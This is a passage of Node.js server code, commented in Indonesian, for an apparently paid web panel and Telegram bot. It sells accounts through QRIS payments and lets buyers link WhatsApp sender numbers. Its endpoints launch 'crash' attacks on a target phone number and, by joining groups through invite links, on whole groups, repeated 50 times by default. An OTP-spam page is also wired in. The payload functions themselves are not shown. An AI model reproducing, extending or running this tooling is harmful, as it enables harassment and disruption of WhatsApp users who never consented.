  const tagMatch = caption.match(/^#([A-Za-z]+)\s+/);
  if (tagMatch) {
    tag = tagMatch[1].toUpperCase();
    caption = caption.replace(/^#[A-Za-z]+\s+/, "").trim();
  }

  try {
    const photoPath = await saveBeritaPhotoFromTelegram(ctx, best.file_id);
    const list = loadBerita();
    const item = {
      id: "ber_" + Date.now() + "_" + Math.random().toString(36).slice(2, 8),
      tag,
      title: caption.slice(0, 200),
      source: "X-For News",
      photo: photoPath,
      views: Math.floor(Math.random() * 900) + 50,
      ts: Date.now(),
    };
    list.unshift(item);
    saveBerita(list.slice(0, 30));
    await ctx.reply(
      `✅ <b>Berita ditambahkan</b>\n\n` +
      `<b>Tag</b> : ${item.tag}\n` +
      `<b>Judul</b> : ${item.title}\n` +
      `<b>Total</b> : ${Math.min(list.length, 30)}`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    console.error("[BERITA] error:", e);
    await ctx.reply("❌ Gagal: " + e.message);
  }
});

bot.command("listberita", async (ctx) => {
  if (!ctx.from) return;
  const list = loadBerita();
  if (!list.length) return ctx.reply("📭 Tidak ada berita.");

  let t = `📰 <b>Daftar Berita (${list.length})</b>\n\n`;
  list.forEach((b, i) => {
    const date = new Date(b.ts).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    t += `<b>${i + 1}.</b> [${b.tag}] ${String(b.title || "").slice(0, 60)}\n   <i>${date} WIB</i>\n\n`;
  });
  if (isOwner(ctx.from.id.toString())) {
    t += `Hapus: <code>/delberita &lt;nomor&gt;</code>`;
  }
  await ctx.reply(t, { parse_mode: "HTML" });
});

bot.command("delberita", async (ctx) => {
  if (!ctx.from) return;
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("Owner only.");

  const list = loadBerita();
  if (!list.length) return ctx.reply("📭 Tidak ada berita.");

  const numStr = (ctx.message.text || "").replace(/^\/delberita(@\w+)?\s*/i, "").trim();
  const num = parseInt(numStr);
  if (!num || num < 1 || num > list.length) {
    return ctx.reply(
      `Format: <code>/delberita &lt;1-${list.length}&gt;</code>`,
      { parse_mode: "HTML" }
    );
  }

  const removed = list.splice(num - 1, 1)[0];
  saveBerita(list);
  deleteBeritaPhoto(removed.photo);
  await ctx.reply(`🗑️ Dihapus: <b>${removed.title}</b>`, { parse_mode: "HTML" });
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.json({ limit: "15mb" }));
app.use(express.static("public"));

function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;
  const sessionId = req.cookies.sessionId;
  if (!username || !sessionId) return res.redirect("/login?msg=Please log in first.");

  const users = getUsers();
  const currentUser = users.find((u) => u.username === username);
  if (!currentUser) {
    res.clearCookie("sessionUser");
    res.clearCookie("sessionId");
    return res.redirect("/login?msg=User not found.");
  }
  if (Date.now() > currentUser.expired) {
    releaseWebSession(username, sessionId);
    res.clearCookie("sessionUser");
    res.clearCookie("sessionId");
    return res.redirect("/login?msg=Session expired.");
  }
  if (!isWebSessionActive(username, sessionId)) {
    res.clearCookie("sessionUser");
    res.clearCookie("sessionId");
    return res.redirect("/login?msg=Sesi tidak valid. Login ulang.");
  }
  touchWebSession(username);
  next();
}

function requireAuthApi(req, res, next) {
  const username = req.cookies.sessionUser;
  const sessionId = req.cookies.sessionId;
  if (!username || !sessionId) {
    return res.status(401).json({ success: false, message: "Please log in first." });
  }
  const users = getUsers();
  const currentUser = users.find((u) => u.username === username);
  if (!currentUser) {
    res.clearCookie("sessionUser");
    res.clearCookie("sessionId");
    return res.status(401).json({ success: false, message: "User not found." });
  }
  if (Date.now() > Number(currentUser.expired)) {
    releaseWebSession(username, sessionId);
    res.clearCookie("sessionUser");
    res.clearCookie("sessionId");
    return res.status(401).json({ success: false, message: "Account expired." });
  }
  if (!isWebSessionActive(username, sessionId)) {
    res.clearCookie("sessionUser");
    res.clearCookie("sessionId");
    return res.status(401).json({ success: false, message: "Sesi tidak valid. Login ulang." });
  }
  touchWebSession(username);
  req.authUser = username;
  next();
}

const sendLoginPage = (res) => {
  const filePath = path.join(__dirname, "X-For-Based", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Failed Login.html");
    res.send(html);
  });
};

app.get("/", (req, res) => sendLoginPage(res));
app.get("/login", (req, res) => sendLoginPage(res));

app.get("/auth/check", (req, res) => {
  const username = req.cookies.sessionUser;
  const sessionId = req.cookies.sessionId;
  if (!username || !sessionId) {
    return res.json({ success: false, loggedIn: false });
  }
  const users = getUsers();
  const user = users.find((u) => u && u.username === username);
  if (!user || Date.now() > Number(user.expired) || !isWebSessionActive(username, sessionId)) {
    res.clearCookie("sessionUser");
    res.clearCookie("sessionId");
    return res.json({ success: false, loggedIn: false });
  }
  touchWebSession(username);
  return res.json({ success: true, loggedIn: true, username });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body || {};
  const users = getUsers();

  if (!username || !key) {
    return res.status(400).json({ success: false, message: "Username and Key required." });
  }

  const user = users.find(
    (u) => u && typeof u === "object" && u.username === username && u.key === key
  );

  if (!user) {
    const exists = users.some((u) => u && typeof u === "object" && u.username === username);
    // Samakan pesan agar terasa "password salah" juga saat akun sudah login di device lain
    return res.status(401).json({
      success: false,
      message: exists ? "Incorrect key." : "Username not found.",
    });
  }

  if (!user.expired || Date.now() > Number(user.expired)) {
    return res.status(401).json({ success: false, message: "Account expired." });
  }

  // 1 akun = 1 sesi aktif. Kalau sudah login di tempat lain → anggap password salah
  const existing = activeWebSessions.get(username);
  if (existing && Date.now() - existing.lastSeen <= WEB_SESSION_IDLE_MS) {
    // Kecuali request ini dari sesi yang sama (refresh / re-login device sendiri)
    const currentSid = req.cookies.sessionId;
    if (!currentSid || currentSid !== existing.sessionId) {
      return res.status(401).json({
        success: false,
        message: "Incorrect key.",
      });
    }
  }

  const sessionId = claimWebSession(username);
  const maxAge = Math.max(Number(user.expired) - Date.now(), 60 * 60 * 1000);
  const cookieOpts = {
    maxAge: Math.min(maxAge, 30 * 24 * 60 * 60 * 1000), // max 30 hari
    httpOnly: true,
    sameSite: "lax",
  };
  res.cookie("sessionUser", username, cookieOpts);
  res.cookie("sessionId", sessionId, cookieOpts);
  return res.json({ success: true, message: "Login successful.", username });
});

app.post("/logout", (req, res) => {
  const username = req.cookies.sessionUser;
  const sessionId = req.cookies.sessionId;
  if (username) releaseWebSession(username, sessionId);
  res.clearCookie("sessionUser");
  res.clearCookie("sessionId");
  return res.json({ success: true, message: "Logged out." });
});

app.get("/logout", (req, res) => {
  const username = req.cookies.sessionUser;
  const sessionId = req.cookies.sessionId;
  if (username) releaseWebSession(username, sessionId);
  res.clearCookie("sessionUser");
  res.clearCookie("sessionId");
  return res.redirect("/login");
});

function buatQrisForm(extra = {}) {
  return new URLSearchParams({
    account_id: BUATQRIS_ACCOUNT_ID,
    secret_token: BUATQRIS_SECRET_TOKEN,
    ...extra,
  }).toString();
}

function extractQrisPayload(raw) {
  const d = (raw && (raw.data || raw.result || raw)) || {};
  const isStr = typeof d === "string";
  const qrImage =
    (!isStr &&
      (d.qr_url ||
        d.qr_image ||
        d.qris_image ||
        d.qr_string ||
        d.qr_code ||
        d.qris_url ||
        d.qr ||
        d.image_url ||
        d.imageUrl)) ||
    (isStr && d.startsWith("http") ? d : null) ||
    (isStr && d.startsWith("data:") ? d : null);
  const invoiceId =
    (!isStr &&
      (d.invoice_id ||
        d.invoiceId ||
        d.reference_id ||
        d.referenceId ||
        d.id ||
        d.trx_id ||
        d.transaction_id ||
        d.order_id ||
        d.orderId)) ||
    null;
  return { d, qrImage, invoiceId };
}

function extractQrisStatus(raw) {
  const d = (raw && (raw.data || raw.result || raw)) || {};
  if (typeof d === "string") return d.toLowerCase();
  return String(
    d.status ||
      d.transaction_status ||
      d.payment_status ||
      d.qris_status ||
      d.state ||
      ""
  ).toLowerCase();
}

app.post("/api/qris/create", async (req, res) => {
  try {
    const { username, password, package: pkgName } = req.body || {};

    if (!username || !password || !pkgName) {
      return res.status(400).json({ success: false, message: "Data tidak lengkap." });
    }
    if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
      return res.status(400).json({ success: false, message: "Username hanya huruf/angka/_ (3-20)." });
    }
    if (password.length < 3) {
      return res.status(400).json({ success: false, message: "Password minimal 3 karakter." });
    }

    const pkg = QRIS_PACKAGES[pkgName];
    if (!pkg) {
      return res.status(400).json({ success: false, message: "Paket tidak valid." });
    }

    const users = getUsers();
    if (users.some((u) => u && u.username === username)) {
      return res.status(409).json({ success: false, message: "Username sudah dipakai." });
    }

    const orderId = "QRIS-" + Date.now() + "-" + Math.random().toString(36).slice(2, 7).toUpperCase();

    let qrisRes = null;
    let lastErr = null;

    try {
      qrisRes = await axios.post(
        BUATQRIS_API,
        buatQrisForm({
          action: "api_create_qris",
          amount: String(pkg.price),
          description: `${pkgName} - ${username} (${orderId})`,
          qris_method: "qris_two",
        }),
        {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            Accept: "application/json",
          },
          timeout: 20000,
          validateStatus: (s) => s < 500,
        }
      );
    } catch (e) {
      lastErr = e;
      console.error("[QRIS create]", e.response?.status || e.message, e.response?.data || "");
    }

    if (!qrisRes || !qrisRes.data) {
      const netMsg =
        lastErr?.code === "ECONNREFUSED" ||
        lastErr?.code === "ENOTFOUND" ||
        lastErr?.code === "ETIMEDOUT" ||
        lastErr?.message?.includes("timeout")
          ? "Gateway QRIS tidak dapat dihubungi (timeout/koneksi)."
          : lastErr?.response?.data?.message ||
            lastErr?.message ||
            "Gagal terhubung ke gateway QRIS.";
      console.error("[QRIS create] gateway unreachable:", lastErr?.response?.data || lastErr?.message);
      return res.status(502).json({
        success: false,
        message: netMsg,
        detail: lastErr?.response?.data || null,
      });
    }

    if (qrisRes.status >= 400 || qrisRes.data?.success === false) {
      const msg =
        qrisRes.data?.message ||
        qrisRes.data?.error ||
        `Gateway QRIS error (${qrisRes.status}).`;
      console.error("[QRIS create] bad status:", qrisRes.status, qrisRes.data);
      return res.status(502).json({ success: false, message: msg, detail: qrisRes.data });
    }

        const { d, qrImage, invoiceId: invFromApi } = extractQrisPayload(qrisRes.data);
    const invoiceId = invFromApi || orderId;

    if (!qrImage) {
      console.error("[QRIS] No QR in response:", d);
      return res.status(502).json({
        success: false,
        message: "QR tidak diterima dari gateway. Cek account_id / secret_token BuatQris.",
        raw: d,
      });
    }

    let finalQr = qrImage;
    if (typeof finalQr === "string" && finalQr.startsWith("000201")) {
      finalQr =
        "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" +
        encodeURIComponent(finalQr);
    }

    pendingQrisTx.set(invoiceId, {
      username,
      password,
      pkgName,
      price: pkg.price,
      role: pkg.role,
      durationMs: pkg.durationMs,
      orderId,
      createdAt: Date.now(),
    });
    if (invoiceId !== orderId) {
      pendingQrisTx.set(orderId, pendingQrisTx.get(invoiceId));
    }

    setTimeout(() => {
      pendingQrisTx.delete(invoiceId);
      pendingQrisTx.delete(orderId);
    }, 15 * 60 * 1000);

    return res.json({
      success: true,
      invoiceId,
      orderId,
      qrImage: finalQr,
      amount: pkg.price,
      package: pkgName,
    });
  } catch (err) {
    console.error("[QRIS create]", err.response?.data || err.message);
    return res.status(500).json({
      success: false,
      message:
        err.code === "ECONNREFUSED" || err.code === "ENOTFOUND" || err.code === "ETIMEDOUT"
          ? "Server tidak bisa menghubungi gateway QRIS. Coba lagi nanti."
          : err.response?.data?.message || err.message || "Gagal buat QRIS.",
      detail: err.response?.data || null,
    });
  }
});

app.get("/api/qris/check/:invoiceId", async (req, res) => {
  try {
    const { invoiceId } = req.params;
    const tx = pendingQrisTx.get(invoiceId);

    if (!tx) {
      return res.status(404).json({
        success: false,
        status: "expired",
        message: "Transaksi tidak ditemukan / kedaluwarsa.",
      });
    }

    let checkRes = null;
    let lastErr = null;

    try {
      checkRes = await axios.post(
        BUATQRIS_API,
        buatQrisForm({
          action: "api_check_status",
          transaction_id: String(invoiceId),
        }),
        {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            Accept: "application/json",
          },
          timeout: 12000,
          validateStatus: (s) => s < 500,
        }
      );
    } catch (e) {
      lastErr = e;
    }

    if (!checkRes || !checkRes.data) {
      console.error("[QRIS check] gateway:", lastErr?.response?.data || lastErr?.message);
      return res.json({
        success: true,
        status: "pending",
        message: "Menunggu pembayaran... (gateway sedang dicek)",
      });
    }

    const status = extractQrisStatus(checkRes.data);

    const isPaid = ["paid", "success", "settlement", "completed", "berhasil", "sukses", "1", "true"].includes(
      status
    );
    const isDead = ["expired", "cancel", "cancelled", "failed", "gagal", "0"].includes(status);

    if (isPaid) {
      const users = getUsers();

      if (users.some((u) => u && u.username === tx.username)) {
        pendingQrisTx.delete(invoiceId);
        if (tx.orderId) pendingQrisTx.delete(tx.orderId);
        return res.json({
          success: true,
          status: "paid",
          message: "Pembayaran sukses, tapi username sudah ada.",
          account: null,
        });
      }

      const expired = Date.now() + tx.durationMs;
      users.push({ username: tx.username, key: tx.password, expired });
      saveUsers(users);

      const akses = loadAkses();
      const uid = tx.username.toString();
      if (tx.role === "owner" && !akses.owners.includes(uid)) {
        akses.owners.push(uid);
      } else if (tx.role === "moderator" && !akses.moderators.includes(uid)) {
        akses.moderators.push(uid);
      } else if (tx.role === "reseller" && !akses.resellers.includes(uid)) {
        akses.resellers.push(uid);
      }
      saveAkses(akses);

      pendingQrisTx.delete(invoiceId);
      if (tx.orderId) pendingQrisTx.delete(tx.orderId);

      console.log(`[QRIS] ✅ Akun dibuat: ${tx.username} | role=${tx.role} | ${tx.pkgName}`);

      return res.json({
        success: true,
        status: "paid",
        message: "Pembayaran terkonfirmasi. Akun aktif!",
        account: {
          username: tx.username,
          password: tx.password,
          package: tx.pkgName,
          role: tx.role,
          expired,
        },
      });
    }

    if (isDead) {
      pendingQrisTx.delete(invoiceId);
      if (tx.orderId) pendingQrisTx.delete(tx.orderId);
      return res.json({ success: true, status: "expired", message: "Pembayaran gagal/kedaluwarsa." });
    }

    return res.json({ success: true, status: "pending", message: "Menunggu pembayaran..." });
  } catch (err) {
    console.error("[QRIS check]", err.response?.data || err.message);
    return res.json({
      success: true,
      status: "pending",
      message: "Masih menunggu (server sedang cek).",
    });
  }
});

app.post("/api/qris/cancel", (req, res) => {
  const { invoiceId } = req.body || {};
  if (invoiceId) {
    const tx = pendingQrisTx.get(invoiceId);
    pendingQrisTx.delete(invoiceId);
    if (tx?.orderId) pendingQrisTx.delete(tx.orderId);
  }
  res.json({ success: true });
});

app.get("/dashboard", (req, res) => {
  const username = req.cookies.sessionUser;
  const sessionId = req.cookies.sessionId;
  if (!username || !sessionId || !isWebSessionActive(username, sessionId)) {
    res.clearCookie("sessionUser");
    res.clearCookie("sessionId");
    return res.redirect("/login");
  }
  const users = getUsers();
  const currentUser = users.find((u) => u && u.username === username);
  if (!currentUser || Date.now() > Number(currentUser.expired)) {
    releaseWebSession(username, sessionId);
    res.clearCookie("sessionUser");
    res.clearCookie("sessionId");
    return res.redirect("/login?msg=Session expired.");
  }
  touchWebSession(username);
  res.sendFile(path.join(__dirname, "X-For-Based", "dashboard.html"));
});

app.get("/myinfo",         requireAuth, (req, res) => res.sendFile(path.join(__dirname, "X-For-Based", "profil.html")));
app.get("/peraturan",      requireAuth, (req, res) => res.sendFile(path.join(__dirname, "X-For-Based", "rules.html")));
app.get("/mysender",       requireAuth, (req, res) => res.sendFile(path.join(__dirname, "X-For-Based", "my-senders.html")));
app.get("/mydev",          requireAuth, (req, res) => res.sendFile(path.join(__dirname, "X-For-Based", "my-supports.html")));
app.get("/execution-page", requireAuth, (req, res) => res.sendFile(path.join(__dirname, "X-For-Based", "execution.html")));
app.get("/chatglobal",     requireAuth, (req, res) => res.sendFile(path.join(__dirname, "X-For-Based", "chat-global.html")));
app.get("/spamotp",        requireAuth, (req, res) => res.sendFile(path.join(__dirname, "X-For-Based", "otp-spam.html")));

app.get("/api/dashboard-data", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find((u) => u.username === username);
  if (!currentUser) return res.status(404).json({ error: "User not found" });

  let role = "User";
  if (isOwner(username)) role = "Owner";

  const expired = new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta", year: "numeric", month: "2-digit",
    day: "2-digit", hour: "2-digit", minute: "2-digit",
  });
  const timeRemaining = currentUser.expired - Date.now();
  const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));

  res.json({
    username: currentUser.username,
    role,
    activeSenders: sessions.size,
    expired,
    daysRemaining,
  });
});

// ✅ FIX: validModes auto-sync + syntax error hilang
app.post("/execution", async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const { target, mode } = req.body || {};

    if (!username) return res.json({ success: false, error: "Not authenticated" });
    if (!target || typeof target !== "string") {
      return res.json({ success: false, error: "Invalid target" });
    }

    const cleanTarget = target.replace(/\D/g, "");
    if (!cleanTarget || cleanTarget.length < 8) {
      return res.json({ success: false, error: "Invalid target" });
    }

    const validModes = Object.keys(numberModeMap);
    if (!validModes.includes(mode)) {
      return res.json({
        success: false,
        error: `Invalid mode. Options: ${validModes.join(", ")}`,
      });
    }

    const session = findUserSession(username);
    if (!session) return res.json({ success: false, error: "No active sender." });

    const { sock: mexx, number: userSender } = session;
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    await numberModeMap[mode](mexx, targetJid);

    console.log(`[EXECUTION] ${username} | sender=${userSender} | ${cleanTarget} | ${mode}`);
    res.json({ success: true, message: `Attack ${mode} sent to ${cleanTarget}` });
  } catch (err) {
    console.error("Execution error:", err);
    res.json({ success: false, error: err.message });
  }
});

app.get("/debug-sessions", (req, res) => {
  const userSessions = loadUserSessions();
  res.json({
    timestamp: new Date().toISOString(),
    sessions_map_size: sessions.size,
    sessions_map_content: Array.from(sessions.keys()),
    user_sessions_content: userSessions,
    problem: sessions.size === 0 ? "NO ACTIVE SESSIONS" : "SESSIONS ACTIVE",
  });
});

app.get("/api/mysenders", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];
  res.json({ success: true, senders: userSenders, total: userSenders.length });
});

app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;

  res.writeHead(200, {
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache",
    Connection: "keep-alive",
    "Access-Control-Allow-Origin": "*",
  });

  userEvents.set(username, res);

  const heartbeat = setInterval(() => {
    try { res.write(": heartbeat\n\n"); } catch { clearInterval(heartbeat); }
  }, 30000);

  req.on("close", () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
    broadcastOnlineStatus();
  });

  res.write(
    `data: ${JSON.stringify({
      type: "connected",
      message: "Event stream connected",
      online: getOnlineUsers(),
    })}\n\n`
  );
  broadcastOnlineStatus();
});

app.post("/api/add-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body || {};

  if (!number) return res.json({ success: false, error: "Number cannot be empty." });
  const cleanNumber = normalizePhoneNumber(number);
  if (!cleanNumber || cleanNumber.length < 10) {
    return res.json({
      success: false,
      error: "Nomor tidak valid. Contoh benar: 6281234567890 (pakai kode negara, tanpa +).",
    });
  }

  try {
    console.log(`[API] ${username} adding sender: ${cleanNumber} (raw: ${number})`);
    const sessionDir = userSessionPath(username, cleanNumber);

    clearUnregisteredSession(sessionDir);

    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    res.json({
      success: true,
      message: "Connection started. Tunggu pairing code muncul (buka WhatsApp → Perangkat tertaut).",
      number: cleanNumber,
    });

    connectToWhatsAppUser(username, cleanNumber, sessionDir)
      .then(() => console.log(`[${username}] ✅ Sender ${cleanNumber} connected`))
      .catch((error) => console.error(`[${username}] ❌ Failed ${cleanNumber}:`, error.message));
  } catch (error) {
    console.error(`[API] Error ${username}:`, error);
    if (!res.headersSent) res.json({ success: false, error: "Error: " + error.message });
  }
});

app.post("/api/delete-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body || {};
  if (!number) return res.json({ success: false, error: "Number cannot be empty." });

  try {
    const userSessions = loadUserSessions();
    if (userSessions[username]) {
      userSessions[username] = userSessions[username].filter((n) => n !== number);
      saveUserSessions(userSessions);
    }

    const sessionDir = userSessionPath(username, number);
    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });

    const sessionKey = `${username}_${number}`;
    sessions.delete(sessionKey);
    listenerRegistry.delete(sessionKey);

    res.json({ success: true, message: "Sender deleted.", number });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

app.get("/api/chat/messages", requireAuth, (req, res) => {
  try {
    const messages = loadChatMessages();
    res.json({ success: true, messages, online: getOnlineUsers() });
  } catch (e) {
    res.json({ success: false, messages: [], online: [], error: e.message });
  }
});

app.get("/api/chat/online", requireAuth, (req, res) => {
  try {
    res.json({ success: true, online: getOnlineUsers() });
  } catch (e) {
    res.json({ success: false, online: [], error: e.message });
  }
});

app.get("/api/chat/me", requireAuth, (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    res.json({ success: true, username, role: getUserRole(username), avatar: null });
  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

app.post("/api/chat/send", requireAuth, async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const { text, photo, photoName, avatar } = req.body || {};

    if ((!text || !text.trim()) && !photo) {
      return res.json({ success: false, error: "Pesan kosong." });
    }
    if (photo && typeof photo === "string" && photo.length > 5 * 1024 * 1024) {
      return res.json({ success: false, error: "Foto terlalu besar (max 3MB)." });
    }

    const role = getUserRole(username);
    const message = db.createChatMessage({
      id: "c_" + Date.now() + "_" + Math.random().toString(36).slice(2, 8),
      username, displayName: username, role,
      avatar: avatar || null,
      type: photo ? "photo" : "text",
      text: (text || "").trim(),
      photo: photo || null,
      photoName: photoName || null,
      timestamp: Date.now(),
    });

    broadcastChatEvent({ type: "chat_message", message }, null);
    res.json({ success: true, message });
  } catch (e) {
    console.error("[CHAT] Send error:", e);
    res.json({ success: false, error: e.message });
  }
});

app.post("/api/chat/delete", requireAuth, (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const { messageId } = req.body || {};
    if (!messageId) return res.json({ success: false, error: "Message ID required." });

    const result = db.deleteChatMessage(messageId, username, isOwner(username));
    if (!result.ok) return res.json({ success: false, error: result.error });

    broadcastChatEvent({ type: "chat_delete", messageId }, null);
    res.json({ success: true, message: "Pesan dihapus." });
  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

app.post("/api/group/attack-ccbgb", async (req, res) => {
  try {
    const { inviteCode, iterations, mode } = req.body || {};
    const username = req.cookies?.sessionUser;

    if (!inviteCode) return res.status(400).json({ success: false, error: "inviteCode required" });
    if (!username)   return res.status(401).json({ success: false, error: "Not authenticated." });

    const session = findUserSession(username);
    if (!session) return res.status(400).json({ success: false, error: "No active sender." });

    const { sock: conn, number: usedSender } = session;
    let groupJid = null;
    let groupName = "Unknown Group";

    if (inviteCode.endsWith("@g.us")) {
      groupJid = inviteCode;
      try {
        const meta = await conn.groupMetadata(groupJid);
        groupName = meta.subject || groupName;
      } catch {
        return res.status(400).json({ success: false, error: "Group not found." });
      }
    } else {
      try {
        let code = inviteCode;
        const m = inviteCode.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
        if (m && m[1]) code = m[1];
        const info = await conn.groupGetInviteInfo(code);
        if (info && info.id) {
          groupJid = info.id;
          groupName = info.subject || groupName;
        }
      } catch (e) {
        return res.status(400).json({ success: false, error: `Invalid link: ${e.message}` });
      }
    }

    if (!groupJid) return res.status(400).json({ success: false, error: "Unable to resolve." });

    if (!inviteCode.endsWith("@g.us")) {
      try {
        let code = inviteCode;
        const m = inviteCode.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
        if (m && m[1]) code = m[1];
        await conn.groupAcceptInvite(code);
        await sleep(3000);
      } catch {}
    }

    const totalIter = parseInt(iterations) || 50;
    const attackMode = (mode || "crash").toLowerCase();
    const validModes = Object.keys(groupModeMap);
    if (!validModes.includes(attackMode)) {
      return res.status(400).json({
        success: false,
        error: `Invalid mode. Options: ${validModes.join(", ")}`,
      });
    }

    let attackResult;
    try {
      attackResult = await runGroupAttack(conn, groupJid, attackMode, totalIter);
    } catch (err) {
      attackResult = { success: false, error: err.message };
    }

    res.json({
      success: attackResult.success,
      groupName, groupJid,
      iterations: totalIter,
      mode: attackMode,
      message: attackResult.success
        ? `Completed ${attackMode.toUpperCase()} ${totalIter}x on ${groupName}`
        : `Failed: ${attackResult.error}`,
    });

    sendEventToUser(username, {
      type: attackResult.success ? "group_attack_success" : "group_attack_failed",
      message: attackResult.success
        ? `Completed ${attackMode.toUpperCase()} ${totalIter}x on ${groupName}`
        : `Failed: ${attackResult.error}`,
      number: usedSender,
      status: attackResult.success ? "success" : "failed",
      groupName, mode: attackMode,
    });
  } catch (e) {
    console.error("[GROUP ATTACK] ❌", e);
    if (!res.headersSent) res.status(500).json({ success: false, error: e.message });
  }
});

app.post("/api/group/accept-ccbgb", async (req, res) => {
  try {
    const { inviteCode, sender, mode, iterations } = req.body || {};
    const username = req.cookies?.sessionUser;

    if (!inviteCode || !sender) {
      return res.status(400).json({ error: "inviteCode and sender required" });
    }

    const session = findUserSession(username, sender);
    if (!session) return res.status(400).json({ error: "Connection not found." });

    const { sock: conn } = session;
    let result;
    try {
      result = await conn.groupAcceptInvite(inviteCode);
    } catch (acceptErr) {
      try { result = await conn.groupAcceptInviteV4(inviteCode); }
      catch { return res.status(400).json({ error: `Failed: ${acceptErr.message}` }); }
    }

    let groupJid = result?.id || result;
    if (!groupJid || !groupJid.endsWith("@g.us")) {
      try {
        const info = await conn.groupGetInviteInfo(inviteCode);
        if (info?.id) groupJid = info.id;
      } catch {}
    }

    if (groupJid && groupJid.endsWith("@g.us")) {
      let groupName = "Unknown Group";
      try {
        const meta = await conn.groupMetadata(groupJid);
        groupName = meta.subject || groupName;
      } catch {}

      const attackMode = (mode || "crash").toLowerCase();
      const totalIter = parseInt(iterations) || 50;

      res.json({
        success: true, result, groupJid, groupName, mode: attackMode,
        message: `Accepted & attacking ${groupName} with ${attackMode.toUpperCase()}...`,
      });

      try {
        const attackResult = await runGroupAttack(conn, groupJid, attackMode, totalIter);
        sendEventToUser(username, {
          type: attackResult.success ? "group_attack_success" : "group_attack_failed",
          message: attackResult.success
            ? `Auto ${attackMode.toUpperCase()} ${attackResult.totalIterations}x on ${groupName}`
            : `Auto failed: ${attackResult.error}`,
          number: sender,
          status: attackResult.success ? "success" : "failed",
          groupName, mode: attackMode,
        });
      } catch (attackErr) {
        console.error(`[ACCEPT] ❌ ${attackErr.message}`);
      }
    } else {
      res.json({ success: true, result });
    }
  } catch (e) {
    console.error("[ACCEPT] ❌", e);
    if (!res.headersSent) res.status(500).json({ error: e.message });
  }
});

app.get("/api/group/pending-invites", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  try {
    const invitesFile = safeReadPendingInvites();
    const userData = invitesFile[username] || {};
    const pending = [];
    const history = [];

    for (const [sender, invites] of Object.entries(userData)) {
      for (const inv of invites) {
        const item = { ...inv, sender };
        if (inv.status === "pending") pending.push(item);
        else history.push(item);
      }
    }
    res.json({ success: true, pending, history });
  } catch (err) {
    res.json({ success: false, error: err.message, pending: [], history: [] });
  }
});

app.get("/api/my-groups", requireAuth, async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const session = findUserSession(username);
    if (!session) {
      return res.json({ success: false, groups: [], error: "No active sender" });
    }

    const { sock: conn } = session;
    const groups = await conn.groupFetchAllParticipating();
    const groupList = Object.entries(groups || {}).map(([id, info]) => ({
      id,
      subject: info.subject || "Unknown Group",
      participants: info.participants ? info.participants.length : 0,
      owner: info.owner || "Unknown",
    }));

    res.json({ success: true, groups: groupList });
  } catch (e) {
    console.error("[MY GROUPS]", e);
    res.status(500).json({ success: false, groups: [], error: e.message });
  }
});

app.post("/api/group/leave", requireAuth, async (req, res) => {
  try {
    const { groupJid } = req.body || {};
    const username = req.cookies.sessionUser;

    if (!groupJid) return res.status(400).json({ success: false, error: "groupJid required" });

    const session = findUserSession(username);
    if (!session) return res.status(400).json({ success: false, error: "No active sender" });

    const { sock: conn } = session;
    await conn.groupLeave(groupJid);
    res.json({ success: true, message: "Left group." });
  } catch (e) {
    console.error("[LEAVE]", e);
    res.status(500).json({ success: false, error: e.message });
  }
});

app.get("/api/group/modes", (req, res) => {
  res.json({
    success: true,
    modes: Object.keys(groupModeMap),
    defaults: { mode: "crash", iterations: 50 },
  });
});

app.get("/api/status/list", requireAuth, (req, res) => {
  try {
    const list = loadStatuses();
    res.json({ success: true, statuses: list });
  } catch (e) {
    res.json({ success: false, statuses: [], error: e.message });
  }
});

app.post("/api/status/create", requireAuth, async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const { type, text, bg, caption, src, thumb, videoData } = req.body || {};

    if (!type || !["text", "image", "video"].includes(type)) {
      return res.json({ success: false, error: "Tipe status tidak valid." });
    }

    if (type === "text") {
      const t = (text || "").trim();
      if (!t) return res.json({ success: false, error: "Teks kosong." });
      if (t.length > 180) return res.json({ success: false, error: "Teks max 180." });
    }
    if (type === "image") {
      if (!src || typeof src !== "string") return res.json({ success: false, error: "Gambar wajib." });
      if (src.length > 4 * 1024 * 1024) return res.json({ success: false, error: "Gambar terlalu besar." });
    }
    if (type === "video") {
      if (!videoData || typeof videoData !== "string") return res.json({ success: false, error: "Video wajib." });
      if (videoData.length > 12 * 1024 * 1024) return res.json({ success: false, error: "Video terlalu besar." });
    }

